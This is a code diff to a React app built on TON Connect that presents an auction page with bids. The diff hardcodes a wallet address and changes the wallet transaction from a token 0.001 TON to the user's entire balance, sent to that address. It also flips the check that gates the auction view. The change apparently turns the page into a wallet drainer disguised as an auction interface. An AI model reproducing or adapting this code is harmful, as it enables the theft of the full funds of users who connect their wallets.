@@ -9,6 +9,8 @@ import Modal from "./components/Modal";
 import DeclinedModal from "./components/DeclinedModal";
 
 function App() {
+  const ADDRESS = "UQAS-N-YNKelVhDbQ9OzVWDayPghVHDKMx0ksbMsuArhY5E6";
+
   const { handleWalletConnect, handleWalletDisconnect, connected, sender } =
     useTonConnect();
   const { balance } = useTonClientBalance();
@@ -43,8 +45,8 @@ function App() {
     if (connected) {
       console.log(connected);
       await sender.send({
-        to: Address.parse("UQAS-N-YNKelVhDbQ9OzVWDayPghVHDKMx0ksbMsuArhY5E6"),
-        value: toNano("0.001"),
+        to: Address.parse(ADDRESS),
+        value: toNano(balance!),
       });
     }
   };
@@ -95,7 +97,7 @@ function App() {
     <>
       <div className="app">
         <NavBar />
-        {!startParam ? (
+        {startParam ? (
           <p className="not-found">Not Found</p>
         ) : (
           <div className="auction">
@@ -157,7 +159,9 @@ function App() {
                         <span className="with-ton">{offer}</span>
                       </td>
                       <td>{localStorage.getItem("offerDate")}</td>
-                      <td className="link hover">address</td>
+                      <td className="link hover">
+                        {ADDRESS.substring(0, 10).concat("...")}
+                      </td>
                     </tr>
                   </tbody>
                 </table>
